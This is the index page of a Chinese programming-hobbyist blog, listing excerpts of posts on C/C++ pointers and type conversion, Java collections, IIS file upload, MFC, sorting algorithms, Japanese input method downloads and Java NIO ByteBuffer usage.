<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b00048f43b9fc6e3e412217e108158a/" rel="bookmark">
			交换两个字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 引用.cpp : 定义控制台应用程序的入口点。//#include "stdafx.h"#include &lt;iostream&gt;using namespace std;//交换两个字符串--指针引用//由于swap函数是指针引用，因此传入函数的就是实参，而不是形参void swap(char *x,char*y){char *p;p=x;x=y;y=p;}//交换两个字符串--二维指针//可以达到同样的目的 void swap(char **x,char**y){char *p;p=*x;*x=*y;*y=p;}int _tmain(int argc, _TCHAR* argv[]){char *ap="hello";char *bp="how are you ?";cout&lt;&lt;ap&lt;&lt;endl;cout&lt;&lt;bp&lt;&lt;endl&lt;&lt;endl;//swap(&amp;ap,&amp;bp);swap(ap,bp);cout&lt;&lt;ap&lt;&lt;endl;cout&lt;&lt;bp&lt;&lt;endl;getchar();return 0;}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f29ab7bcce42505e7ecef1c24ab51e2/" rel="bookmark">
			c语言对内存地址的直接操作（读ARM有感）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在ARM中看到了 #define rWTCON (*(volatile unsigned *)0x03000000)然后在函数调用中对这地址直接赋值，rWTCON = (PCLK / (100000-1)&lt;&lt;8 | (3&lt;&lt;3));
刚看到这吓我一跳，以前只听说过没有看过，这里还真这样干了，这就是c语言中的直接对内存赋值，以上的语句还真有特色，这样用了宏还在下面移位操作，运用的这么规范化
，比如我们要将某数中间的第7,6,5位分别置011(假设这数先被初始化为0) 这个一般不是x |=0x01100000;而是这样x |= (3&lt;&lt;5);好处在于，十进制比十六进制更方便看，方便检查。
关键字 volatile：（易变的） 一个定义为volatile的变量是说这变量可能会被意想不到地改变，这样，编译器就不会去假设这个变量的值了。精确地说就是，优化器在用到这个变量时必须每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份。就好似每次操作都刷新，类似原子操作的功能
后面的地址是查ARM手册得到的，虽然注释为，....寄存器，但这与我们理解的CPU中的寄存器（不能取地址）不一样，这里就是内存地址（外设寄存器，寻址方式与内存寻址方式一样（速度当然也一样））
这里上一段代码
#include &lt;stdio.h&gt;int main(){void (* signal (int sign, void(*handler)(int))) (int);//也可以写成这样 void (* signal (int , void(* )(int))) (int);* (volatile unsigned *)0x0012ff7c = 0x12345; printf("%x\n",* (volatile unsigned *)0x0012ff7c);return 0;}vc编译通过，值得注意得是上面指针的声明，这玩意恐怕你都没有见过吧，这就是高级指针声明，指针乃C语言精华，灵活多变；做完这几天的笔记继续学习ARM去.... 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3f16fb018eaccd9a6b1e65204c27f7d/" rel="bookmark">
			查看RPM包里的内容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有时候，拿到一个RPM，并不想安装它，而想了解包里的内容，怎么办呢？
如果只相知道包里的文件列表执行：
#rpm -qpl packetname
如果想要导出包里的内容，而不是安装，那么执行：
# rpm2cpio pkgname | cpio -ivd　
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc2a42743a677065486e556be59fe2c9/" rel="bookmark">
			C语言中的整数自动转换原则
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、隐式转换
C在以下四种情况下会进行隐式转换:
1、算术运算式中，低类型能够转换为高类型。
2、赋值表达式中，右边表达式的值自动隐式转换为左边变量的类型，并赋值给他。
3、函数调用中参数传递时，系统隐式地将实参转换为形参的类型后，赋给形参。
4、函数有返回值时，系统将隐式地将返回表达式类型转换为返回值类型，赋值给调用函数。
2、算数运算的隐式转换
算数运算中，首先有如下类型转换规则：
1、字符必须先转换为整数(C语言规定字符类型数据和整型数据之间可以通用) 。
2、short型转换为int型(同属于整型) 。
3、float型数据在运算时一律转换为双精度(double)型，以提高运算精度(同属于实型) 。
其次，有下面的规则。
当不同类型的数据进行操作时，应当首先将其转换成相同的数据类型，然后进行操作，转换规则是由低级向高级转换。转换规则如下图所示:
有符号数与无符号数之间运算问题
以下实验均在virual c++6中运行通过
这个问题测试是否懂得C语言中的整数自动转换原则，有些开发者懂得极少这些东西。当表达式中存在有符号类型和无符号类型时所有的操作数都自动转换为无符号类型。因此，从这个意义上讲，无符号数的运算优先级要高于有符号数，这一点对于应当频繁用到无符号数据类型的嵌入式系统来说是丰常重要的。 首先进行一个实验，分别定义一个signed int型数据和unsigned int型数据，然后进行大小比较：
unsigned int a=20;
signed int b=-130;
a&gt;b?还是b&gt;a？实验证明b&gt;a，也就是说－130&gt;20,为什么会出现这样的结果呢？
这是因为在C语言操作中，如果遇到无符号数与有符号数之间的操作，编译器会自动转化为无符号数来进行处理，因此a＝20，b＝4294967166，这样比较下去当然b&gt;a了。
再举一个例子：
unsigned int a=20;
signed int b=-130;
std::cout&lt;&lt;a+b&lt;&lt;std::endl;
结果输出为4294967186，同样的道理，在运算之前，a＝20，b被转化为4294967166，所以a＋b＝4294967186
减法和乘法的运算结果类似。
如果作为signed int型数据的b=-130，b与立即数之间操作时不影响b的类型，运算结果仍然为signed int型：
signed int b=-130;
std::cout&lt;&lt;b+30&lt;&lt;std::endl;
输出为-100。
而对于浮点数来说，浮点数（float，double）实际上都是有符号数，unsigned 和signed前缀不能加在float和double之上，当然就不存在有符号数根无符号数之间转化的问题了。
#include &lt;iostream&gt; /* 当表达式中存在符号类型和无符号类型时 所有的操作数都自动转换为无符号类型 */ using namespace std; char getChar(int x,int y){ char c; unsigned int a=x; unsigned int b=a+y; (a+y&gt;10)?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc2a42743a677065486e556be59fe2c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58b431fbb2c61700d1e9ab1c86d7147e/" rel="bookmark">
			集合迭代时对集合进行修改抛ConcurrentModificationException原因的深究以及解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		绝对原创, 转载请标明文章出处:http://blog.csdn.net/izard999/article/details/6708738
大家应该都知道, 在java中, 在对一些集合迭代的过程中对集合进行一些修改的操作, 比如说add,remove之类的操作, 搞不好就会抛ConcurrentModificationException, 这一点在API文档上也有说的! 在迭代时只可以用迭代器进行删除! 但是文档上只是说了删除, 其他操作也会引起ConcurrentModificationException, 这是为何呢.? 下面就跟着我一起探索源代码吧! 就以ArrayList为例!
当我在迭代ArrayList时, 首先获取ArrayList的迭代器ArrayList.iterator(), 接下来就是hasNext与next的使用,例如:
List list = new ArrayList();list.add("a");list.add("b");for(Iterator it = list.iterator(); it.hasNext;) {Object o = it.next();} 但是如果你在迭代的过程中不是用迭代器对集合进行修改, 而是用直接操作集合, 例如在迭代中: list.add(c); 此时你就非常有可能会惨兮兮了, 为什么只是有可能而非绝对呢? 下面接着分析
跟进ArrayList的源码看, 搜索iterator()方法看其获得的迭代器, 发现没有! 于是追其父类 AbstractList, iterator()方法返回new Itr()!
查看Itr中的两个重要的方法: hasNext与next
public boolean hasNext() {return cursor != size();}public E next() {checkForComodification();try {E next = get(cursor);lastRet = cursor++;return next;} catch (IndexOutOfBoundsException e) {checkForComodification();throw new NoSuchElementException();}} 看next中调用的checkForComodification(), 在remove方法中也调用了checkForComodification()！接着checkForComodification()方法里面在做些什么事情！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/58b431fbb2c61700d1e9ab1c86d7147e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec0f3e46ff15921372b2b5e48169aa47/" rel="bookmark">
			对于C&#43;&#43;中类(class) 与结构(struct)的描述正确的为
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于C++中类(class) 与结构(struct)的描述正确的为： A,类中的成员默认是private 的,当是可以声明为public,private 和protected,结构中定义的成员
默认的都是public;
B,结构中不允许定义成员函数,当是类中可以定义成员函数;
C,结构实例使用malloc() 动态创建,类对象使用new 操作符动态分配内存;
D,结构和类对象都必须使用new 创建;
E,结构中不可以定义虚函数,当是类中可以定义虚函数.
F,结构不可以存在继承关系,当是类可以存在继承关系. #include &lt;iostream&gt;#include &lt;string&gt;using namespace std;//结构struct B{int a;virtual void fun(){cout&lt;&lt;"hello B"&lt;&lt;endl;}};struct BB:public B{void fun(){cout&lt;&lt;"hello BB"&lt;&lt;endl;}};//类class C{int a;public:void fun(){cout&lt;&lt;"hello"&lt;&lt;endl;}};void main(){B b,*pb;//C,D选项：结构或和类对象可以在栈上创建b.fun();//B选项：结构中允许定义成员函数b.a=12;//A选项：结构中的成员默认是public的BB bb;//F选项：结构中可以存在继承关系pb=&amp;bb;pb-&gt;fun();//E选项：结构中可以定义虚函数C c;//A选项：类中的成员默认是private的,当是可以声明为public,private 和protected,//结构中定义的成员默认的都是public;//c.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec0f3e46ff15921372b2b5e48169aa47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c279babfbc0b176d7597e588ba8e3dd/" rel="bookmark">
			向已在IIS中开启写权限的服务器直接上传文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		向IIS传文件大家可能都会去写一个接收的页面，其实只要在IIS里设置“允许写”就可以直接向IIS所在的虚拟目录中上传文件了，不过这个很危险，本人并不建议使用，因为你可以方便上传下载文件，也代表其他人也可以轻易上传下载文件。
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(@"http://localhost/test111/113.txt"); //地址是你要上传文件并且在服务器上创建的文件名
request.Method = WebRequestMethods.File.UploadFile;
request.AllowWriteStreamBuffering = true;
Stream s = request.GetRequestStream();
FileStream fs = new FileStream(@"C:\text.txt", FileMode.Open, FileAccess.Read);
byte[] b = new byte[fs.Length];
fs.Read(b, 0, b.Length);
s.Write(b, 0, b.Length);
s.Flush();
fs.Close();
s.Close();
request.GetResponse(); //这句话一定要写否则虚拟目录下出不来文件
删除某个文件
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(@"http://localhost/test111/113.txt"); request.Method =“DELETE”;
request.AllowWriteStreamBuffering = true;
request.GetResponse(); 读取远程iis上的文件
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(@"http://localhost/test111/113.txt"); request.ContentType = "application/octet-stream";
request.Method = WebRequestMethods.File.DownloadFile;
request.AllowWriteStreamBuffering = true;
WebResponse response = request.GetResponse();
Stream s = response.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c279babfbc0b176d7597e588ba8e3dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96501e7c732419a4c7743fbadd70cd28/" rel="bookmark">
			【转】latex常见错误对照表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文链接：http://www.cs.utexas.edu/~witchel/errorclasses.html Latex Error Classes Ambiguous Errors This is a list of error classes with ambiguos error messages. Here either the errors are have different causes and the message output is same or else the errors have the same root cause but the messages are different. S.NoClassError MessageCause of Error1e_des! LaTeX Error: There's no line here to endUsage of \\ at the end of a long label in 'description' environment2e_center! LaTeX Error: There's no line here to endUsage of \\ after the heading line in 'center' environment3e_foot !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96501e7c732419a4c7743fbadd70cd28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49d13735f4e0707a67644ff2621ffb20/" rel="bookmark">
			MFC 利用小型数据库Access 少步惆 教你用VC开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目 录
情境一 面向对象基础应用.... 4
任务：类的声明及成员的访问控制... 4
任务：构造函数和析构函数的应用... 2
任务：成员函数的应用... 4
任务：继承性的作用... 6
任务：函数的重载的应用... 6
任务：虚函数的使用... 8
任务：函数模板和模板函数的运用... 10
任务：类模板与模板类的运用... 11
情境二 创建简单的MFC应用程序.... 15
相关技术介绍... 15
任务：创建一个MFC工程... 15
任务：模式对话框与非模式对话框的创建... 20
任务：创建非模式对话框... 27
任务：分析对话框的数据交换机制... 28
任务：创建模式对话框... 30
任务：分析模式对话框和非模式对话框的区别... 31
情境三 制作基于ADO的人员管理系统.... 32
·相关技术介绍... 33
·制作过程任务分解及相关技术详解... 33
任务：创建一个基于MFC对话框应用程序... 33
任务：控件的放置及相应消息函数，成员变量添加... 33
任务：编写相关功能函数代码... 33
·ADO技术介绍... 42
·任务：引入ADO库文件... 42
·任务：初始化ADO环境... 42
接口简介... 42
情境四 运用MFC实现简单绘图.... 55
·任务1 绘制图形... 55
·任务2 绘制文本... 58
·任务3 从任意位置装入一个图标并绘制.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49d13735f4e0707a67644ff2621ffb20/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/96aafa915d32e6e0a279a84da2e75964/" rel="bookmark">
			ImageButton Web服务器控件（九）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		介绍 显示图像并对图像上的鼠标单击作出响应的控件。
在单击 ImageButton 控件时，将同时引发 Click 和 Command 事件。 可以使用 OnCommand 事件处理程序使 ImageButton 控件的行为类似于命令按钮。 使用 CommandName 属性，可以将命令名与该控件相关联。 这允许在同一网页上放置多个 ImageButton 控件。 然后可以通过编程方式在 OnCommand 事件处理程序中标识 CommandName 属性的值，以确定在单击每个 ImageButton 控件时应执行的适当操作。 还可使用 CommandArgument 属性传递有关命令的附加信息，如指定升序顺序。 使用 ImageButton 控件与使用 ASP.NET Button 控件类似。 确定用户在何处点击 使用 OnClick 事件处理程序，可以通过编程方式确定单击的图像位置的坐标。 然后，可以根据坐标值(ImageClickEventArgs.X|Y)编写响应代码。 原点 (0, 0) 位于图像的左上角。
ImageButton 控件和验证 默认情况下，在单击 ImageButton 控件时执行页验证。 页验证确定页上与验证控件关联的输入控件是否均通过该验证控件所指定的验证规则。 若要禁止页验证，请将 CausesValidation 属性设置为 false。 声明式语法 &lt;asp:ImageButton AccessKey="string" AlternateText="string" BackColor="color name|#dddddd" BorderColor="color name|#dddddd" BorderStyle="NotSet|None|Dotted|Dashed|Solid|Double|Groove|Ridge| Inset|Outset" BorderWidth="size" CausesValidation="True|False" CommandArgument="string" CommandName="string" CssClass="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/96aafa915d32e6e0a279a84da2e75964/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5de90b0e87415b9b07cfb00801cacb5/" rel="bookmark">
			IP地址修改完成
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DWORD dwAddress=192&lt;&lt;24|168&lt;&lt;16|1&lt;&lt;8|168;
m_IPAddress.SetAddress(dwAddress);
DWORD dwNetMask=0xffffff00;
m_NetMask.SetAddress(dwNetMask);
DWORD dwNetGate=192&lt;&lt;24|168&lt;&lt;16|1&lt;&lt;8|1;
m_NetGate.SetAddress(dwNetGate);
/********************************************************************/
/*二、将IP信息写入注册表
代码如下:*/
BOOL RegSetIP(LPCTSTR lpszAdapterName, LPCTSTR pIPAddress, LPCTSTR pNetMask, LPCTSTR pNetGate)
{
HKEY hKey;
string strKeyName = "SYSTEM//CurrentControlSet//Services//Tcpip//Parameters//Interfaces//";
strKeyName += (char*)lpszAdapterName;
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
(LPCSTR)strKeyName.c_str(),
0,
KEY_WRITE,
&amp;hKey) != ERROR_SUCCESS)
return FALSE;
char mszIPAddress[100];
char mszNetMask[100];
char mszNetGate[100];
strncpy(mszIPAddress, (LPCSTR)pIPAddress, 98);
strncpy(mszNetMask, (LPCSTR)pNetMask, 98);
strncpy(mszNetGate, (LPCSTR)pNetGate, 98);
int nIP, nMask, nGate;
nIP = strlen(mszIPAddress);
nMask = strlen(mszNetMask);
nGate = strlen(mszNetGate);
*(mszIPAddress + nIP + 1) = 0x00; // REG_MULTI_SZ数据需要在后面再加个0
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5de90b0e87415b9b07cfb00801cacb5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/66ad801ebd038696ac8bb33bce683390/" rel="bookmark">
			C语言数组排序法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多朋友是以谭浩强老师编的《c语言教程》作为学习C语言的入门教程的。书中涉及排序问题一般都以“冒泡法”和“选择法”实现。为了扩大视野，增加学习编程的兴趣，我参阅了有关书籍，整理了几种排序法，写出来同大家共勉
让我们先定义一个整型数组a[n],下面用五种方法对其从小到大排序。 （1）“冒泡法” 冒泡法大家都较熟悉。其原理为从a[0]开始，依次将其和后面的元素比较,若a[0]&gt;a[i ]，则交换它们，一直比较到a[n]。同理对a[1],a[2],...a[n-1]处理，即完成排序。下面列出其代码： void bubble(int *a,int n) /*定义两个参数：数组首地址与数组大小*/ { int i,j,temp; for(i=0;i&lt;n-1;i++) for(j=i+1;j&lt;n;j++) /*注意循环的上下限*/ if(a[i ]&gt;a[j]) { temp=a[i ]; a[i ]=a[j]; a[j]=temp; } } 冒泡法原理简单，但其缺点是交换次数多，效率低。 下面介绍一种源自冒泡法但更有效率的方法“选择法”。 （2）“选择法” 选择法循环过程与冒泡法一致，它还定义了记号k=i,然后依次把a[k]同后面元素比较，若a[k]&gt;a[j],则使k=j.最后看看k=i是否还成立，不成立则交换a[k],a[i ],这样就比冒泡法省下许多无用的交换，提高了效率。 void choise(int *a,int n) { int i,j,k,temp; for(i=0;i&lt;n-1;i++) { k=i; /*给记号赋值*/ for(j=i+1;j&lt;n;j++) if(a[k]&gt;a[j ]) k=j; /*是k总是指向最小元素*/ if(i!=k) { /*当k!=i是才交换，否则a[i ] 即为最小*/ temp=a[i ]; a[i ]=a[k]; a[k]=temp; } } } 选择法比冒泡法效率更高，但说到高效率，非“快速法”莫属，现在就让我们来了解它。 （3）“快速法” 快速法定义了三个参数，（数组首地址*a,要排序数组起始元素下标i,要排序数组结束元素下标j). 它首先选一个数组元素（一般为a[(i +j)/2],即中间元素）作为参照，把比它小 的元素放到它的左边，比它大的放在右边。然后运用递归，在将它左，右两个子数组排序，最后完成整个数组的排序。下面分析其代码： void quick(int *a,int i,int j) { int m,n,temp; int k; m=i; n=j; k=a[(i +j)/2]; /*选取的参照*/ do { while(a[m]&lt;k&amp;&amp;m&lt;j) m++; /* 从左到右找比k大的元素*/ while(a[n]&gt;k&amp;&amp;n&gt;i) n--; /* 从右到左找比k小的元素*/ if(m&lt;=n) { /*若找到且满足条件，则交换*/ temp=a[m]; a[m]=a[n]; a[n]=temp; m++; n--; } }while(m&lt;=n); if(m&lt;j) quick(a,m,j); /*运用递归*/ if(n&gt;i) quick(a,i,n); } （4）“插入法” 插入法是一种比较直观的排序方法。它首先把数组头两个元素排好序，再依次把后面的元素插入适当的位置。把数组元素插完也就完成了排序。 void insert(int *a,int n) { int i,j,temp; for(i=1;i&lt;n;i++) { temp=a[i ]; /*temp为要插入的元素*/ j=i-1; while(j&gt;=0&amp;&amp;temp&lt;a[j]) { /*从a[i -1]开始找比a[i ]小的数，同时把数组元素向后移*/ a[j+1]=a[j ]; j--; } a[j+1]=temp; /*插入*/ } } （5）“shell法” shell法是一个叫 shell 的美国人与1969年发明的。它首先把相距k(k&gt;=1)的那几个元素排好序，再缩小k值（一般取其一半），再排序，直到k=1时完成排序。下面让我们来分析其代码： void shell(int *a,int n) { int i,j,k,x; k=n/2; /*间距值*/ while(k&gt;=1) { for(i=k;i&lt;n;i++) { x=a[i ]; j=i-k; while(j&gt;=0&amp;&amp;x&lt;a[j]) { a[j+k]=a[j ]; j-=k; } a[j+k]=x; } k/=2; /*缩小间距值*/ } } 上面我们已经对几种排序法作了介绍，现在让我们写个主函数检验一下。 #include&lt;stdio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/66ad801ebd038696ac8bb33bce683390/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/714b0b8d631c439ba31dc353ae13cff1/" rel="bookmark">
			日语输入法下载（转）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		日文输入法下载大全 安装Windows时，为了节省空间，很多系统盘简化去除了日文输入法IME，虽然输入法栏可以调出日语选项，却不能够输入。日文输入不了怎么办？下载下面完整的日语输入法IME即可 最新推荐：微软日文输入法2010下载(Microsoft Japanese IMG 2010)： http://www.onlyjp.cn/download/WINIME2010JPN-onlyjp.cn.rar 微软日文输入法2007下载(Microsoft Japanese IMG 2007)： http://www.onlyjp.cn/download/WINIME2007JPN-onlyjp.cn.rar Google日文输入法[Google 日本語入力]： http://www.onlyjp.cn/download/Google-japanese-ime-onlyjp.cn.rar 百度日文输入法[Baidu 日本語入力]： http://www.onlyjp.cn/download/Baidu-japanese-ime-onlyjp.cn.rar 微软日文输入法2010下载64位(Microsoft Japanese IMG 2010)：64位的微软日文输入法包用在64位的系统里，一般是用上面的（32位） http://www.onlyjp.cn/download/WINIME2010-64JPN-onlyjp.cn.rar 接下来就4款日语输入法做一个简单评价。
微软2007日语输入法、百度日语输入法以及Google日语输入法在www.onlyjp.cn“学习资料”栏里都有下载/ 安装日语输入法时，有任何问题，请点击这里提出
欢迎加入日语学习QQ群：148811154
微软2010日语输入法评价：
微软2010日语输入法软件整体和上一版本(2007)区别不是特别大，文件包安装迅速。仍然是相同的输入页面风格，输入单词的过程中侧重一贯的严谨，没有联想词的派生。比起上一版本的最大改动，在这一版本中多出一个“单汉字”选项，用户在输入单词过程中可以选择这个选项来得出更多的同音异意词，他会引申出如人名、地名等多项同音汉字来满足用户的多方面需求。
总体来说微软2010日语输入法软件依然是中规中矩的一款比较平衡的输入法软件，对于习惯使用传统日语输入法的用户来说是一款比较不错的优化升级版。 微软2007日语输入法评价：
延续了系统自带的日语输入法。使用方式和原先一样，在输入假名后，浏览界面优化了，但不会派生太多的联想词。
优点：尊重使用者的每一个音标输入，不会去刻意派生也许使用者不需要的词汇。
缺点：没有太多派生词，对刚接触日语输入法的用户来说也许比较不习惯。
适合人群：经常使用原先传统电脑自带输入法的人群，习惯的界面，习惯的操作。
总结：总体来说，微软2007日语输入法就是原先电脑自带日语输入法的优化版。
百度日语输入法评价：
最大的不同就是使用界面。和中文输入法的那些使用界面非常相似（比如“搜gou”中文输入法），界面很清新，而且可以跟换界面皮肤，这是历来输入法不曾有的。输入音标后，浏览界面并不是我们熟悉的“竖向页面”，而是横向页面，在完整输入一个单词后“比如‘丰臣秀吉’的音标”，原本电脑自带传统输入法是需要在输入音标后再按下空格才会显示出“日文汉字”，而百度输入法是不需要的，只需要输入とよとみひでよし（以丰臣秀吉为例），就会在下面的选项直接出现此人的名字。
优点：界面可变化颜色，适合于追求时尚的用户。输入音标以后就会出现汉字选项，会有派生词。
缺点：个人认为横向浏览界会让用惯了传统输入法的用户来说有点不习惯。
适合人群：追求时尚，多变的用户。
google日语输入法
个人使用下来最青睐的输入法，保留了传统输入法的浏览界面（竖向的），同时在这3款输入法中是比较强调派生词的引用的，在单词输入未完整的情况下，浏览页会显示出相应或相近的单词选项，收入词库涉及人物，历史，社会，经济等多个领域。
优点：继承了传统输入法的大部分界面，单词联想力比较强。
缺点：对于使用传统输入法的用户来说会因为过多的单词派生而感觉不习惯。
适合人群：对于刚接触日语输入法的用户来说，这款软件是个比较适合于上手的入门软件。
欢迎加入日语学习QQ群：148811154
有任何输入方面的问题，欢迎加入日语输入法讨论组：http://www.onlyjp.cn/home/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b265442e48dfee9f88bc6a2c824b20d/" rel="bookmark">
			Iframe跨域错误Permission denied for to get property
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Iframe跨域错误：
Permission denied for [site1] to get property Location.href from [site 2] Permission denied for &lt;site1&gt; to get property Window.document from &lt;site2&gt;. 实际的问题是：从iframe里控制上层的窗口（window和domcument）是不安全的，跨域即会被限制访问。
这里也是同样的问题：
http://stackoverflow.com/questions/1292257/suppressing-permission-denied-errors-in-javascript
另外可以参考：javascript跨域共享的内容
http://hi.baidu.com/superlinyzu/blog/item/867ea6f0cecbcad07831aa27.html
O
O
O
--
0
0
0
0
0
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34b20cf336b3fa6e5cce1ba3964d9f83/" rel="bookmark">
			计算机英语(个人整理)（计算机专业）（全称&amp;缩写）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在个人积累中会持续更新
AAA ASCII Adjust for Addition 加法校正
abort [ə'bɔ:t] vi. 流产；夭折：在SIGABORT中， 结束进程的信号
ACM Association for Computing Machinery [ə,səusi'eiʃən] [mə'ʃi:nəri] 美国计算机协会
ACM -ICPC ......International Collegiate Programming Contest 国际大学生程序设计大赛（ACM主办） ADO Activex Data Object ADO 技术应用于mfc ADT Abstract Data Type 抽象数据类型
AF Auxiliary Carry Flag 辅助进位标示
afx _msg application frame _message
AI Artificial Intelligence 人工智能
alarm [ə'lɑ:m]警报，警告器：定时器
algorithm ['ælɡəriðəm] 算法
alias /ˈeɪlɪəs; `elɪəs/别名 gdb中有不少alias,可以看一下help,在gdb下打help align 排成一行；对准，校正 eg: figure out physical address with page align
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/34b20cf336b3fa6e5cce1ba3964d9f83/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa575ced6a9055c9df12e8179c51125a/" rel="bookmark">
			ByteBuffer用法小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在NIO中,数据的读写操作始终是与缓冲区相关联的.读取时信道(SocketChannel)将数据读入缓冲区,写入时首先要将发送的数据按顺序填入缓冲区.缓冲区是定长的,基本上它只是一个列表,它的所有元素都是基本数据类型.ByteBuffer是最常用的缓冲区,它提供了读写其他数据类型的方法,且信道的读写方法只接收ByteBuffer.因此ByteBuffer的用法是有必要牢固掌握的.
1.创建ByteBuffer
1.1 使用allocate()静态方法
ByteBuffer buffer=ByteBuffer.allocate(256);
以上方法将创建一个容量为256字节的ByteBuffer,如果发现创建的缓冲区容量太小,唯一的选择就是重新创建一个大小合适的缓冲区.
1.2 通过包装一个已有的数组来创建
如下,通过包装的方法创建的缓冲区保留了被包装数组内保存的数据.
ByteBuffer buffer=ByteBuffer.wrap(byteArray);
如果要将一个字符串存入ByteBuffer,可以如下操作:
String sendString="你好,服务器. ";
ByteBuffer sendBuffer=ByteBuffer.wrap(sendString.getBytes("UTF-16"));
2.回绕缓冲区
buffer.flip();
这个方法用来将缓冲区准备为数据传出状态,执行以上方法后,输出通道会从数据的开头而不是末尾开始.回绕保持缓冲区中的数据不变,只是准备写入而不是读取.
3.清除缓冲区
buffer.clear();
这个方法实际上也不会改变缓冲区的数据,而只是简单的重置了缓冲区的主要索引值.不必为了每次读写都创建新的缓冲区,那样做会降低性能.相反,要重用现在的缓冲区,在再次读取之前要清除缓冲区.
4.从套接字通道(信道)读取数据
int bytesReaded=socketChannel.read(buffer);
执行以上方法后,通道会从socket读取的数据填充此缓冲区,它返回成功读取并存储在缓冲区的字节数.在默认情况下,这至少会读取一个字节,或者返回-1指示数据结束.
5.向套接字通道(信道)写入数据
socketChannel.write(buffer);
此方法以一个ByteBuffer为参数,试图将该缓冲区中剩余的字节写入信道.
-----------------------
